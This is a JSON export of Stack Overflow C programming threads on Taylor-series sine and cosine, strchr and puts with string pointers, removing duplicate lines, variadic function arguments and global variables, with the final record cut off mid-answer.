[{"tags": ["c", "performance", "trigonometry", "taylor-series"], "comments": [{"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 2, "creation_date": 1524700868, "post_id": 50032893, "comment_id": 87081922, "body": "I expect you want <a href=\"https://en.wikipedia.org/wiki/Memoization\" rel=\"nofollow noreferrer\">memoization</a>, particularly since you call sen coss and fat multiple times for the same input. Or e.g. for fat you can just precompute it for 0-9 and store that in an array."}, {"owner": {"reputation": 93172, "user_id": 1734130, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AZ5Sn.png?s=128&g=1", "display_name": "mvp", "link": "https://stackoverflow.com/users/1734130/mvp"}, "edited": false, "score": 2, "creation_date": 1524701134, "post_id": 50032893, "comment_id": 87081983, "body": "Taylor series only work well for small values of x. Perhaps you should normalize input x to be in canonical range <code>(-pi,+pi)</code>, because <code>sin(x)=sin(x+2*pi*n)</code> for any n."}, {"owner": {"reputation": 93172, "user_id": 1734130, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AZ5Sn.png?s=128&g=1", "display_name": "mvp", "link": "https://stackoverflow.com/users/1734130/mvp"}, "edited": false, "score": 0, "creation_date": 1524701875, "post_id": 50032893, "comment_id": 87082185, "body": "@RafaelSantos: to make input value smaller, simply replace it using something like this: <code>x=x - int(x&#47;(2*pi))*2*pi</code>."}, {"owner": {"reputation": 39, "user_id": 9700866, "user_type": "registered", "profile_image": "https://graph.facebook.com/1727463590648720/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/9700866/rafael-santos"}, "edited": false, "score": 0, "creation_date": 1524701968, "post_id": 50032893, "comment_id": 87082199, "body": "Memoization helped a bit, but the real problem is the number of times the code runs because of the recursions :/"}, {"owner": {"reputation": 39, "user_id": 9700866, "user_type": "registered", "profile_image": "https://graph.facebook.com/1727463590648720/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/9700866/rafael-santos"}, "reply_to_user": {"reputation": 93172, "user_id": 1734130, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AZ5Sn.png?s=128&g=1", "display_name": "mvp", "link": "https://stackoverflow.com/users/1734130/mvp"}, "edited": false, "score": 0, "creation_date": 1524702064, "post_id": 50032893, "comment_id": 87082224, "body": "@mvp what do you mean? I didn&#39;t get it"}, {"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 0, "creation_date": 1524703147, "post_id": 50032893, "comment_id": 87082492, "body": "Really? With memoization you should run coss and sen exactly once for each value between 1 and n (and only one of the two at n), so you should avoid the exponential blow-up you&#39;re seeing."}, {"owner": {"reputation": 93172, "user_id": 1734130, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AZ5Sn.png?s=128&g=1", "display_name": "mvp", "link": "https://stackoverflow.com/users/1734130/mvp"}, "edited": false, "score": 1, "creation_date": 1524703194, "post_id": 50032893, "comment_id": 87082506, "body": "@RafaelSantos: it&#39;s basic property of all trigonometric functions, as they have period 2*pi. You can make input number (I guess you&#39;re using n, but I prefer to call it x) smaller by removing or adding 2*pi increments, without changing your answer."}], "owner": {"reputation": 39, "user_id": 9700866, "user_type": "registered", "profile_image": "https://graph.facebook.com/1727463590648720/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/9700866/rafael-santos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 280, "favorite_count": 1, "closed_date": 1524701254, "answer_count": 0, "score": 0, "last_activity_date": 1524701748, "creation_date": 1524700639, "last_edit_date": 1524701748, "question_id": 50032893, "link": "https://stackoverflow.com/questions/50032893/calculate-sinx-and-cosx-using-taylor-series-in-c", "closed_reason": "Duplicate", "title": "Calculate sin(x) and cos(x) using Taylor Series in C", "body": "<p>(It's different from the other question. Mine uses Taylor Series recursively as the other uses the MacLaurin Expansions of the functions)</p>\n\n<p>I made a C program to calculate the sine and cosine of a number using Taylor Series. It works fine, but it takes a lot of time for bigger numbers. I want to know how can I improve my code to work faster. I thought about the intervals of both functions where f(x)=0, but I don't know if it helps and how can I use them in the code. </p>\n\n<p>I did it recursively and the (x-a) term always equals 1. So a=x-1.</p>\n\n<p>Can somebody help me please? I'd be grateful.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nunsigned long int fat(int a);\ndouble sen(int n);\ndouble coss(int n);\n\nint main(void){\n    int n;\n    scanf(\"%d\",&amp;n);\n    printf(\"%f %f\\n\",sen(n),coss(n));\n    return 0;\n}\n\nunsigned long int fat(int a){\n    unsigned long int x;\n    if (a==0) return 1;\n    else{\n         for(x=1;a&gt;0;a--) x=x*a;\n         return x;\n    }\n}\n\ndouble sen(int n){\n    int x,i;\n    double r;\n    if(n==0) return 0;\n    for(x=r=0,i=1;x&lt;10;x++,i++){\n         if(i==5) i=1;   \n         if(i==1) r+=(sen(n-1))/(fat(x));\n         if(i==2) r+=(coss(n-1))/(fat(x));\n         if(i==3) r-=(sen(n-1))/(fat(x));\n         if(i==4) r-=(coss(n-1))/(fat(x));\n    }\n    return r;\n}\n\ndouble coss(int n){\n    int x,i;\n    double r;\n    if(n==0) return 1;\n    for(x=r=0,i=1;x&lt;10;x++,i++){\n        if(i==5) i=1;   \n        if(i==1) r+=(coss(n-1))/(fat(x));\n        if(i==2) r-=(sen(n-1))/(fat(x));\n        if(i==3) r-=(coss(n-1))/(fat(x));\n        if(i==4) r+=(sen(n-1))/(fat(x));\n    }\n    return r;\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "puts"], "comments": [{"owner": {"reputation": 897, "user_id": 3830887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9aa739aedfb6760abc3605091e12810e?s=128&d=identicon&r=PG&f=1", "display_name": "TonyB", "link": "https://stackoverflow.com/users/3830887/tonyb"}, "edited": false, "score": 1, "creation_date": 1524701537, "post_id": 50032698, "comment_id": 87082080, "body": "For &quot;what a function does&quot;, use the &quot;man&quot; pages... e.g.: man strchr.  Regarding &quot;I get confused with pointer and string&quot;:  A pointer is simply a variable that contains an address.  A &quot;string&quot;, is not a &quot;formal&quot; type, it is sort of an alias for an &quot;array of characters, followed by a null (0x00) character&quot;... In the case of: char *t = &quot;MEAS:VOLT:DC?&quot;; ... a string is created in memory somewhere, and the address to the first character (&quot;M&quot;) is put into the &quot;t&quot; variable."}], "answers": [{"tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": false, "score": 2, "last_activity_date": 1524708998, "creation_date": 1524708998, "answer_id": 50033835, "question_id": 50032698, "link": "https://stackoverflow.com/questions/50032698/how-puts-function-pointer-and-string-work-why-would-strchr-get-characters-a/50033835#50033835", "title": "how puts function , pointer and string work? why would strchr() get characters after the searched character?", "body": "<p>What is a pointer? A pointer is variable that stores an address (memory\nlocation). This can be the address of another variable</p>\n\n<pre><code>int n = 9;\nint *ptr = &amp;n; // stores the address of n\n</code></pre>\n\n<p>or it can be the start of a memory block, for example a dynamically allocated\nmemory block:</p>\n\n<pre><code>int *fields = malloc(len * sizeof *fields);\n</code></pre>\n\n<p>Whatever address a pointer is pointing to, we use pointers to directly access\nthe memory that is stored in the pointer (we also say <em>where the pointer is\npointing to</em>).</p>\n\n<p>What are strings? What you've got to understand is that C does not have a string type like other\nprogramming languages do. In C a string is just a sequence of 8-bit values\n(representing characters) that end with the <code>'\\0'</code>-terminating byte. The natural\ntype for a single character is a <code>char</code>, that's why we use <code>char*</code> or <code>char[]</code>\nto get a string.</p>\n\n<p>When you do </p>\n\n<pre><code>const char *str = \"Hello\";\n</code></pre>\n\n<p><code>str</code> points somewhere in memory and it looks like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>b = base address of the first character in the\n    sequence\n\nb     b+1   b+2   b+3   b+4   b+5\n+-----+-----+-----+-----+-----+------+\n| 'H' | 'e' | 'l' | 'l' | 'o' | '\\0' |\n+-----+-----+-----+-----+-----+------+\n</code></pre>\n\n<p>The integer values of character constants like <code>'H'</code> are determine by the\n<a href=\"https://www.asciitable.com/\" rel=\"nofollow noreferrer\">ASCII</a> table. So in reality the memory looks like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>b = base address of the first character in the\n    sequence\n\nb     b+1   b+2   b+3   b+4   b+5\n+----+-----+-----+-----+-----+-----+\n| 72 | 101 | 108 | 108 | 111 |  0  |\n+----+-----+-----+-----+-----+-----+\n</code></pre>\n\n<p>So <code>str</code> points to that location <code>b</code>, <code>str[0]</code> is the first character, <code>str[1]</code>\nis the second, etc. As you see, to get a string, all you need is access to\nthe first character in the sequence. That's the reason why we use a <code>char*</code>\npointer to address strings, because with the <code>char*</code> pointer we have access to\nthe first and the subsequent characters in the string.</p>\n\n<p>A function like <code>puts(str)</code> does the following:</p>\n\n<ul>\n<li>is the current character the <code>'\\0'</code>-terminating byte?\n\n<ul>\n<li>if yes, then exit</li>\n<li>if no, then print the character and advance to the next one</li>\n</ul></li>\n</ul>\n\n<p>So <code>puts(str)</code> does not print the address where the pointer is pointing, it prints the contents of the memory where the\npointer is pointing to.</p>\n\n<p>A function like <code>strchr</code> works like this:</p>\n\n<blockquote>\n  <p><em>man strchr</em></p>\n\n<pre><code>char *strchr(const char *s, int c);\n</code></pre>\n  \n  <p><strong>DESCRIPTION</strong></p>\n  \n  <p>The <code>strchr()</code> function returns a pointer to the first occurrence of the character <code>c</code> in the string <code>s</code>.</p>\n</blockquote>\n\n<p>Now that you know about the memory layout of strings, this should be easy to\nunderstand. Let's take a look at this:</p>\n\n<pre><code>const char *str = \"Hello\";\nchar *f = strchr(str, 'l');\n</code></pre>\n\n<p>Remember, the memory layout for where <code>str</code> is pointing to is:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>b = base address of the first character in the\n    sequence\n\nb     b+1   b+2   b+3   b+4   b+5\n+-----+-----+-----+-----+-----+------+\n| 'H' | 'e' | 'l' | 'l' | 'o' | '\\0' |\n+-----+-----+-----+-----+-----+------+\n               ^\n               \u00a6\n       first occurrence\n            of 'l'\n</code></pre>\n\n<p>so what <code>strchr</code> returns is a pointer pointing to <code>b+2</code> (or <code>str+2</code>, because in\nmy example b is the value that the pointer <code>str</code> is storing).</p>\n\n<p>That's why when do you <code>puts(str)</code> you get <code>Hello</code>, and when you do <code>puts(f)</code>\nyou get <code>llo</code>.</p>\n\n<p>A simple implementation for <code>strchr</code> is:</p>\n\n<pre><code>char *strchr(const char *s, int c);\n{\n    // stop when the \\0-terminating byte is reached\n    for(size_t i = 0; s[i] != '\\0'; ++i)\n    {\n        if(s[i] == c)\n            return &amp;s[i];  // or return s+i; using pointer arithmetic\n    }\n\n    return NULL; // c is not found in the string\n}\n</code></pre>\n\n<p>So what does this do?</p>\n\n<pre><code>while(( p = strchr( p, ':' )) != NULL )\n{ \n    puts( ++p )\n}\n</code></pre>\n\n<p>The first time that <code>strchr</code> returns a value that is not <code>NULL</code>, it will return\na pointer to the first occurrence of the colon <code>:</code>. <code>puts(++p)</code> is equivalent to</p>\n\n<pre><code>p = p + 1; // let p point to the next next character after the colon\nputs(p);   // prints the string\n</code></pre>\n\n<p>then <code>strchr</code> is executed again, because there is one more colon <code>:</code> in the\nstring, it will not return <code>NULL</code> but the location of where <code>:</code> is stored. The\nnext time the loop is executed, there are no more colons and <code>strchr</code> will\nreturn <code>NULL</code>, thus ending the loop. So the output will be:</p>\n\n<pre><code>MEAS:VOLT:DC?       // puts( p );\nVOLT:DC?            // 1. puts( ++p ); of the loop\nDC?                 // 2. puts( ++p ); of the loop\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 9688029, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Xia", "link": "https://stackoverflow.com/users/9688029/xia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 373, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1524708998, "creation_date": 1524698821, "last_edit_date": 1524700277, "question_id": 50032698, "link": "https://stackoverflow.com/questions/50032698/how-puts-function-pointer-and-string-work-why-would-strchr-get-characters-a", "title": "how puts function , pointer and string work? why would strchr() get characters after the searched character?", "body": "<p>The example is below. In my understanding, <code>t</code> and <code>p</code> are the same pointers pointing to the address of a string?\nI get confused with pointer and string. Would <code>puts(p)</code> give the address of the string instead of characters? Also, I can't figure out how <code>strchr</code> funcition works. ++p would point to the next character after ':', that is how it works, is it correct?\n Please help! Thanks.</p>\n\n<pre><code>char *t = \"MEAS:VOLT:DC?\";\nchar *p;  \np = t;     \nputs( p );\nwhile(( p = strchr( p, ':' )) != NULL )\n{ puts( ++p )}}\n</code></pre>\n"}, {"tags": ["c", "arrays", "string", "duplicates"], "comments": [{"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "edited": false, "score": 1, "creation_date": 1524698826, "post_id": 50032662, "comment_id": 87081463, "body": "1. Do you want detection or removal? 2. Do you want changes in-place or in a separate result? 3. Why do you believe the input string can only have at most MAXCHARS characters/octets? 4. Are you assuming the string is in the US ASCII character set?"}, {"owner": {"reputation": 21, "user_id": 9700582, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a02ee455a21992454cde7af1e1f80b3?s=128&d=identicon&r=PG&f=1", "display_name": "jtuntalan", "link": "https://stackoverflow.com/users/9700582/jtuntalan"}, "reply_to_user": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "edited": false, "score": 0, "creation_date": 1524699016, "post_id": 50032662, "comment_id": 87081517, "body": "1. Removal. 2. Ideally, the changes would stay in a, since I will be using it later, so I guess lots of the indecies will be moved around. 3. Overall instruction requests to only worry about MAXCHARS 4. Yes"}], "answers": [{"tags": [], "owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "is_accepted": false, "score": 2, "last_activity_date": 1524699087, "creation_date": 1524699087, "answer_id": 50032726, "question_id": 50032662, "link": "https://stackoverflow.com/questions/50032662/remove-identical-consecutive-lines-in-a-char-array-in-c/50032726#50032726", "title": "Remove identical, consecutive lines in a char array in C", "body": "<p>Some guidance:</p>\n\n<ul>\n<li>You only ever to copy each character at most once - backwards, to its destination. No need for extra copies.</li>\n<li>You'll have a \"finalized up to here\" position in the array and a \"being processed/read\" position.</li>\n<li>Keep track of the current full-line which may be duplicated, and match each new line against it to check whether it's a dupe.</li>\n<li>Advance by full lines rather than by characters - except when looking for the next end-of-line. </li>\n</ul>\n"}], "owner": {"reputation": 21, "user_id": 9700582, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a02ee455a21992454cde7af1e1f80b3?s=128&d=identicon&r=PG&f=1", "display_name": "jtuntalan", "link": "https://stackoverflow.com/users/9700582/jtuntalan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1524702645, "creation_date": 1524698570, "last_edit_date": 1524702645, "question_id": 50032662, "link": "https://stackoverflow.com/questions/50032662/remove-identical-consecutive-lines-in-a-char-array-in-c", "title": "Remove identical, consecutive lines in a char array in C", "body": "<p>I'm trying to create a function that will detect if there are consecutive lines in a char array that are identical. </p>\n\n<p>For example, if a char array contained:</p>\n\n<blockquote>\n  <p>Hi</p>\n  \n  <p>Hello</p>\n  \n  <p>Hello</p>\n  \n  <p>Hello</p>\n  \n  <p>Hello</p>\n</blockquote>\n\n<p>then the array would be changed to</p>\n\n<blockquote>\n  <p>Hi</p>\n  \n  <p>Hello</p>\n</blockquote>\n\n<p>Essentially, I want to detect the consecutive, identical lines, and delete them so only one of the lines remains. If one line is identical to a earlier line, but they are not consecutive, then it's fine.</p>\n\n<p>Really, the whole line doesn't have to be identical, but at least the first 79, or MAXCHARS, have to be identical.</p>\n\n<p>Additionally, I don't want to do this by writing to an intermediate file. Ideally, I would store data in arrays instead. </p>\n\n<p>I was thinking something like:</p>\n\n<pre><code>    int deleteRepeats(char *a)\n {\n         int i;\n          for (i=0; i&lt;=MAXCHARS; i++) {\n          if (a[i] != '\\n')\n              /* copy into new array /*\n        }\n }\n</code></pre>\n\n<p>but I'm somewhat lost. I don't want to print the array right now, because I will be altering it again later in my program; I still need to use a. </p>\n\n<p>Any help/solution is greatly appreciated. Thank you.</p>\n"}, {"tags": ["c", "printf", "ellipse"], "comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1524697073, "post_id": 50032424, "comment_id": 87080997, "body": "It&#39;s not a &quot;must&quot; ... you are reading a tutorial about this option"}, {"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 0, "creation_date": 1524724434, "post_id": 50032424, "comment_id": 87088518, "body": "I would not use tutorialspoint, at least a few years ago it was full of unclarities and mistakes."}], "answers": [{"comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 2, "creation_date": 1524697525, "post_id": 50032476, "comment_id": 87081126, "body": "If I recall correctly, although there does not need to be an int argument, there must be at least one argument before the ellipsis."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1524697672, "post_id": 50032476, "comment_id": 87081168, "body": "@EricPostpischil yes, because a <code>va_list</code> needs a named argument to determine where the optional variadic arguments begin in memory. If you want a function that can omit all arguments, you need an overload or macro that passes in a dummy argument to the real function."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1524698150, "post_id": 50032476, "comment_id": 87081284, "body": "Variadic parameters are not necessarily passed via memory. It depends on the ABI and modern ABI for CPUs suitable to use registers follow the normal conventions like for non-varioadic parameters. See AAPCS and - AFAIK - x64 ABIs for examples. Nothing of this is specified by the language standard, ther could be as well divine influence."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1524699589, "post_id": 50032476, "comment_id": 87081653, "body": "You could mention that in the answer. Although it states at least one argument should convey argument information to the callee, that alone does not rule out a declaration of <code>function(...)</code> where the callee already knows the first type."}, {"owner": {"reputation": 1067, "user_id": 5752410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bc3e1e22952ae6a52f034d2d7c42467?s=128&d=identicon&r=PG&f=1", "display_name": "Eitanos30", "link": "https://stackoverflow.com/users/5752410/eitanos30"}, "edited": false, "score": 0, "creation_date": 1524787347, "post_id": 50032476, "comment_id": 87123333, "body": "@RemyLebeau,Eric Postpischil - 1. But we see that in printf function there isn&#39;t argument before the char*, although from reading your&#39;s correspondence it seems you say that at least one argument have to be send before the ellipses  so i am a little bit confuse . Can someone explain me please?  2. The ellipse function uses va_arg(list,type), so if we will use a  required sentry value we still need to think of a way that the called function will know what are the types it need to ask each time she uses va_args?"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 1067, "user_id": 5752410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bc3e1e22952ae6a52f034d2d7c42467?s=128&d=identicon&r=PG&f=1", "display_name": "Eitanos30", "link": "https://stackoverflow.com/users/5752410/eitanos30"}, "edited": false, "score": 0, "creation_date": 1524788037, "post_id": 50032476, "comment_id": 87123502, "body": "@Eitanos30, in <code>printf</code>, the <code>char*</code> IS the one fixed argument before the ellipse. Look at the declaration for yourself: <code>\u200bint printf( const char *format, ... );</code> The <code>format</code> parameter is <i>always required</i>, but anything after it is <i>optional</i>, depending on the particular content of the <code>format</code> string, which provides <code>printf</code> with all of the information it needs to know the ellipse argument count and types.  There is no sentry used."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 1067, "user_id": 5752410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bc3e1e22952ae6a52f034d2d7c42467?s=128&d=identicon&r=PG&f=1", "display_name": "Eitanos30", "link": "https://stackoverflow.com/users/5752410/eitanos30"}, "edited": false, "score": 0, "creation_date": 1524788536, "post_id": 50032476, "comment_id": 87123608, "body": "@Eitanos30 If you use a sentry to end the argument list, all of the ellipse argument types must follow a pre-determined pattern of some kind that both caller and callee agree on, so the callee can use <code>va_arg()</code> with the correct type for each ellipse argument. For instance, making every ellipse argument the same type. Or having the value of one ellipse argument determine the type of the next ellipse argument. Or, having each ellipse argument be a struct that contains a type field and a union of allowed value types to pick from."}, {"owner": {"reputation": 1067, "user_id": 5752410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bc3e1e22952ae6a52f034d2d7c42467?s=128&d=identicon&r=PG&f=1", "display_name": "Eitanos30", "link": "https://stackoverflow.com/users/5752410/eitanos30"}, "edited": false, "score": 0, "creation_date": 1525125172, "post_id": 50032476, "comment_id": 87234730, "body": "@RemyLebeau before using va_args, we must create va_list by va_start macro. va_start gets two parameters: one is va_list and the second one seems to be the number of arguments send by ellipses. If i will use a sentry value, as i understand (please correct me if i&#39;m wrong), it won&#39;t help me know how many arguments are passed by ellipses since sentry value is one of those arguments, and access to it is only available via va_args (after va_start macros was written). What i&#39;m trying to ask/understand is, if sentry value is part of the ellipses argument or part of the arguments that come before.."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 1067, "user_id": 5752410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bc3e1e22952ae6a52f034d2d7c42467?s=128&d=identicon&r=PG&f=1", "display_name": "Eitanos30", "link": "https://stackoverflow.com/users/5752410/eitanos30"}, "edited": false, "score": 0, "creation_date": 1525127190, "post_id": 50032476, "comment_id": 87235362, "body": "@Eitanos30 &quot;<i>va_start gets two parameters: one is va_list and the second one seems to be the number of arguments send by ellipses</i>&quot; - WRONG, the 2nd parameter is the <b>name</b> of the last fixed parameter before the ellipse, to let the <code>va_list</code> know where to begin getting values from. The variadic function being called doesn&#39;t know how many values are being passed in the ellipse, so it can&#39;t pass a count to <code>va_start()</code> even if it wanted to. If you use a sentry value to signal the end of the ellipse, you have to loop through the <code>va_list</code> until you read the sentry value from <code>va_arg()</code>."}], "tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": false, "score": 3, "last_activity_date": 1524697543, "last_edit_date": 1524697543, "creation_date": 1524697086, "answer_id": 50032476, "question_id": 50032424, "link": "https://stackoverflow.com/questions/50032424/does-ellipses-function-in-c-must-get-an-int-argument-before/50032476#50032476", "title": "Does ellipses function in c must get an int argument before", "body": "<p>No, passing an <code>int</code> is not a REQUIREMENT, as proved by <code>printf()</code>.  What you see in the tutorial is specific to the <code>func()</code> and <code>average()</code> examples presented by the tutorial (although the <code>func()</code> example does not match the <code>int</code> explanation correctly, but the <code>average()</code> example does).</p>\n\n<p>Only the caller knows how many parameter values it is passing in (and of what type(s)), so you need to design your variadic functions in such a way that the caller has to specify how many parameter values are actually being passed in (and optionally their types).  There are two ways to do that:</p>\n\n<ul>\n<li><p>passing in a required leading parameter.  This could be an <code>int</code> specifying the exact argument count.  Or it could be a string that the function parses to determine the arguments (this is what <code>printf</code> does).</p></li>\n<li><p>passing in a required sentry value as the last argument value.  Then the function simply uses all of the arguments it finds until it reaches that sentry.</p></li>\n</ul>\n"}], "owner": {"reputation": 1067, "user_id": 5752410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bc3e1e22952ae6a52f034d2d7c42467?s=128&d=identicon&r=PG&f=1", "display_name": "Eitanos30", "link": "https://stackoverflow.com/users/5752410/eitanos30"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 198, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1524697543, "creation_date": 1524696705, "last_edit_date": 1524696918, "question_id": 50032424, "link": "https://stackoverflow.com/questions/50032424/does-ellipses-function-in-c-must-get-an-int-argument-before", "title": "Does ellipses function in c must get an int argument before", "body": "<p>According to what is written in the explanation in <a href=\"https://www.tutorialspoint.com/cprogramming/c_variable_arguments.htm\" rel=\"nofollow noreferrer\">C - Variable Arguments</a>:</p>\n\n<blockquote>\n  <p>Define a function with its last parameter as ellipses <strong>and the one just before the ellipses is always an int</strong> which will represent the number of arguments.</p>\n</blockquote>\n\n<p>Is it really a must to send an int to the ellipse function before <code>...</code>?</p>\n\n<p>I saw the prototype of the <code>printf()</code> function, and before <code>...</code> the function gets <code>const char *</code> and there isn't any <code>int</code> before the <code>...</code>.</p>\n"}, {"tags": ["c", "global-variables"], "comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 2, "creation_date": 1524696278, "post_id": 50032318, "comment_id": 87080733, "body": "<code>extern const</code>?"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1524699741, "post_id": 50032318, "comment_id": 87081692, "body": "@OliverCharlesworth: I suspect OP wants other functions to be able to modify the object."}], "answers": [{"tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": 